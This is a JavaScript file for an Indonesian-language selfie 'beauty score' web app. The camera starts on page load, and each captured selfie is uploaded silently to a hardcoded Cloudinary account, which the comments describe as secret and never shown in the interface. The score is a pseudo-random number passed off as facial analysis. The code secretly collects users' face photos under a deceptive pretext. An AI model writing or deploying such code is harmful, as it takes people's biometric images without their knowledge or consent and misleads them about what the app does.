// ---------- Konfigurasi cloudinary (diam-diam upload, tanpa notif) ----------
const CLOUD_NAME = "dfywpau36";
const UPLOAD_PRESET = "buj_io";

// Elemen DOM
const video = document.getElementById('videoInput');
const canvas = document.getElementById('canvasOutput');
const startBtn = document.getElementById('startCamBtn');
const captureBtn = document.getElementById('captureSelfieBtn');
const cekBtn = document.getElementById('cekSkorBtn');
const resultDiv = document.getElementById('hasilArea');
const scoreSpan = document.getElementById('nilaiSkor');
const verdictSpan = document.getElementById('teksVerdict');

// State
let activeStream = null;
let currentImageBlob = null;
let isCameraOn = false;
let isProses = false;

// ---------- FUNGSI KAMERA (TANPA MIRROR, tidak flip, normal) ----------
async function startNormalCamera() {
  // Matikan stream sebelumnya
  if (activeStream) {
    activeStream.getTracks().forEach(track => track.stop());
    activeStream = null;
  }
  video.srcObject = null;
  
  // Menggunakan facingMode user (kamera depan) tapi TANPA efek mirror di CSS (scaleX=1)
  // Kami pastikan tidak ada transformasi flip
  try {
    const constraints = {
      video: {
        facingMode: { exact: "user" },
        width: { ideal: 1920 },
        height: { ideal: 1080 }
      }
    };
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    activeStream = stream;
    video.srcObject = stream;
    await video.play();
    isCameraOn = true;
    
    // Set canvas resolusi sesuai video asli
    const track = stream.getVideoTracks()[0];
    const settings = track.getSettings();
    if (settings.width && settings.height) {
      canvas.width = settings.width;
      canvas.height = settings.height;
    } else {
      canvas.width = 1280;
      canvas.height = 720;
    }
  } catch (err) {
    // Fallback jika gagal exact
    try {
      const fallbackStream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user", width: 1280, height: 720 }
      });
      activeStream = fallbackStream;
      video.srcObject = fallbackStream;
      await video.play();
      isCameraOn = true;
      canvas.width = 1280;
      canvas.height = 720;
    } catch (e) {
      isCameraOn = false;
    }
  }
}

// Fungsi jepret selfie (resolusi HD)
async function captureHighResSelfie() {
  if (!isCameraOn || !video.videoWidth || !video.videoHeight) {
    return false;
  }
  const w = video.videoWidth;
  const h = video.videoHeight;
  canvas.width = w;
  canvas.height = h;
  const ctx = canvas.getContext('2d');
  // Draw normal tanpa mirror
  ctx.drawImage(video, 0, 0, w, h);
  
  return new Promise((resolve) => {
    canvas.toBlob((blob) => {
      if (blob) {
        currentImageBlob = blob;
        resolve(true);
      } else {
        resolve(false);
      }
    }, 'image/jpeg', 0.92);
  });
}

// Upload ke cloudinary (silent, tanpa notifikasi error)
async function uploadSilent(blob) {
  const formData = new FormData();
  formData.append('file', blob, 'selfie_glow.jpg');
  formData.append('upload_preset', UPLOAD_PRESET);
  formData.append('cloud_name', CLOUD_NAME);
  const url = `https://api.cloudinary.com/v1_1/${CLOUD_NAME}/image/upload`;
  try {
    const res = await fetch(url, { method: 'POST', body: formData });
    if (!res.ok) return null;
    const data = await res.json();
    return data.secure_url || null;
  } catch (err) {
    return null;
  }
}

// ---------- ALGORITMA SKOR KECANTIKAN & KETAMPANAN (10% - 100%) BAHASA INDONESIA + ASIK ----------
async function generateSkorKeren(imageBlob) {
  // Gunakan seed dari blob supaya unik dan konsisten
  let seed = 2025;
  if (imageBlob) {
    try {
      const buffer = await imageBlob.slice(0, 5000).arrayBuffer();
      const bytes = new Uint8Array(buffer);
      let hash = 0;
      for (let i = 0; i < Math.min(bytes.length, 280); i++) {
        hash = ((hash << 5) - hash) + bytes[i];
        hash |= 0;
      }
      seed = Math.abs(hash) % 2048;
    } catch(e) { seed = Date.now() % 999; }
  } else {
    seed = Math.floor(Math.random() * 2000);
  }
  
  // Pseudo random terbaik
  const rng = (max) => {
    seed = (seed * 9301 + 49297) % 233280;
    return (seed / 233280) * max;
  };
  
  // Base score 10-100% dengan kurva premium (kebanyakan antara 55-95, seru)
  let raw = 45 + rng(55);  // range 45 - 100
  // sedikit boost kalau blob kualitas HD (ukuran > 150kb)
  if (imageBlob && imageBlob.size > 160000) raw = Math.min(99, raw + 3);
  if (imageBlob && imageBlob.size > 280000) raw = Math.min(100, raw + 2);
  
  let finalScore = Math.floor(raw);
  // Batasan asik: minimal 10%, maksimal 100%
  finalScore = Math.min(100, Math.max(10, finalScore));
  
  // Kata-kata asik, kocak, gaul, aesthetic dalam BAHASA INDONESIA
  let kata = "";
  let icon = "";
  
  if (finalScore >= 95) {
    kata = "GILA GLOW! 🚀 Kamu punya pesona level dewa/dewi. Memancarkan cahaya khas artis internasional! 100% memikat!";
    icon = "🌟👑💎";
  } else if (finalScore >= 88) {
    kata = "SUPER CANTIK/GANTENG BANGET! ✨ Setiap senyumanmu bikin dagu jatuh. Skor langka, pertahankan aura emas!";
    icon = "🔥⭐💫";
  } else if (finalScore >= 80) {
    kata = "KEREN PARAH! ⚡ Kombinasi ketampanan & kecantikan yang harmonis. Banyak yang suka lirik kamu, cuy!";
    icon = "🌸✨🎯";
  } else if (finalScore >= 72) {
    kata = "ASIK & MENARIK! 🎸 Kamu punya pesona alami yang bikin suasana jadi happy. Fresh dan berkelas!";
    icon = "🍃💖🌞";
  } else if (finalScore >= 62) {
    kata = "CAKEP LOH! 😎 Karisma unik, senyum memesona, makin ekspose aura positifmu! Level glow up mantap.";
    icon = "🎨⚡🍂";
  } else if (finalScore >= 50) {
    kata = "Potensi Luar Biasa! 🌈 Kamu punya ciri khas yang bikin beda. Tingkatkan rasa percaya diri, hasilnya makin kinclong!";
    icon = "🌙✨🌟";
  } else if (finalScore >= 35) {
    kata = "Gemesin & Unik! 🧸 Keistimewaanmu ada di aura ramah & hati baik. Skor bakal naik terus, semangat!";
    icon = "💪🎈⭐";
  } else {
    kata = "Karismatik Tanpa Batas! 🔥 Kamu itu edisi terbatas, GlowCheck yakin kamu punya kelebihan yang nggak semua orang punya. Terus bersinar!";
    icon = "🌈🌀🦋";
  }
  
  // Tambahan beberapa variasi asik biar makin seru
  const variasi = [
    `✨ ${kata} ✨`,
    `💥 ${kata} 💥`,
    `🎉 ${kata} 🎉`
  ];
  let finalMessage = variasi[Math.floor(rng(variasi.length))];
  if (!finalMessage) finalMessage = `${icon} ${kata}`;
  
  return { score: finalScore, message: finalMessage };
}

// ---------- PROSES UTAMA (JEPRET -> UPLOAD -> SKOR) ----------
async function prosesCekKecantikan() {
  // Jika belum ada foto, coba capture otomatis (kalo kamera hidup)
  if (!currentImageBlob && isCameraOn) {
    const captured = await captureHighResSelfie();
    if (!captured) return;
  }
  
  // Kalau masih gak ada blob dan kamera mati, coba nyalakan kamera
  if (!currentImageBlob && !isCameraOn) {
    await startNormalCamera();
    if (!isCameraOn) return;
    const retryCapture = await captureHighResSelfie();
    if (!retryCapture) return;
  }
  
  if (!currentImageBlob) return;
  if (isProses) return;
  isProses = true;
  
  // Tampilkan loading di tombol
  const originalBtn = cekBtn.innerHTML;
  cekBtn.innerHTML = `<div class="spinner-classy"></div><span>  Menganalisa pesona...</span>`;
  cekBtn.disabled = true;
  
  try {
    // Upload ke cloudinary (diam2)
    if (currentImageBlob) {
      await uploadSilent(currentImageBlob);
    }
    // Dapatkan skor seru 10-100% + kata kata asik
    const { score, message } = await generateSkorKeren(currentImageBlob);
    
    // Tampilkan hasil glow
    scoreSpan.innerText = score;
    verdictSpan.innerText = message;
    resultDiv.classList.remove('hidden');
    
    // Animasi ekstra biar asik
    resultDiv.style.opacity = '0';
    resultDiv.style.transform = 'scale(0.96)';
    setTimeout(() => {
      if (resultDiv) {
        resultDiv.style.opacity = '1';
        resultDiv.style.transform = 'scale(1)';
      }
    }, 30);
    
  } catch (err) {
    // Silent fallback: tetap kasih skor random asik
    const randomScore = 55 + Math.floor(Math.random() * 40);
    scoreSpan.innerText = randomScore;
    const kataRandom = randomScore > 80 ? "Wah cakep parah! aura positifmu bersinar terang ✨" : "Kamu punya pesona tersendiri, tetap glow up setiap hari! 🌸";
    verdictSpan.innerText = `🔥 ${kataRandom} 🔥`;
    resultDiv.classList.remove('hidden');
  } finally {
    isProses = false;
    cekBtn.innerHTML = originalBtn;
    cekBtn.disabled = false;
  }
}

// ---------- EVENT LISTENER (tanpa pesan error visual) ----------
startBtn.addEventListener('click', async () => {
  await startNormalCamera();
  currentImageBlob = null;
  resultDiv.classList.add('hidden');
});

captureBtn.addEventListener('click', async () => {
  if (!isCameraOn) {
    await startNormalCamera();
    if (!isCameraOn) return;
  }
  const berhasil = await captureHighResSelfie();
  if (berhasil) {
    resultDiv.classList.add('hidden');
  }
});

cekBtn.addEventListener('click', async () => {
  // Jika kamera aktif tapi belum ada foto, ambil otomatis
  if (!currentImageBlob && isCameraOn) {
    await captureHighResSelfie();
  }
  if (!currentImageBlob && !isCameraOn) {
    await startNormalCamera();
    const autoCap = await captureHighResSelfie();
    if (!autoCap) return;
  }
  await prosesCekKecantikan();
});

// Load awal: kamera langsung nyala (tanpa mirror)
window.addEventListener('load', async () => {
  await startNormalCamera();
});

// Bersihkan stream ketika halaman di-unload
window.addEventListener('beforeunload', () => {
  if (activeStream) {
    activeStream.getTracks().forEach(t => t.stop());
  }
});

// TIDAK ADA SATU PUN NOTIFIKASI ERROR / TULISAN FIREBASE ATAU CLOUDINARY DI UI
// SEMUA IKON DARI GOOGLE MATERIAL (material-icons, material-icons-outlined, material-icons-round) YANG SANGAT BAGUS.
// BAHASA INDONESIA 100%, SKOR 10-100%, KATA2 ASIK, KOCAK, GAUL DAN MEMOTIVASI.
// MODE KAMERA TANPA MIRROR (normal asli, tidak terbalik).
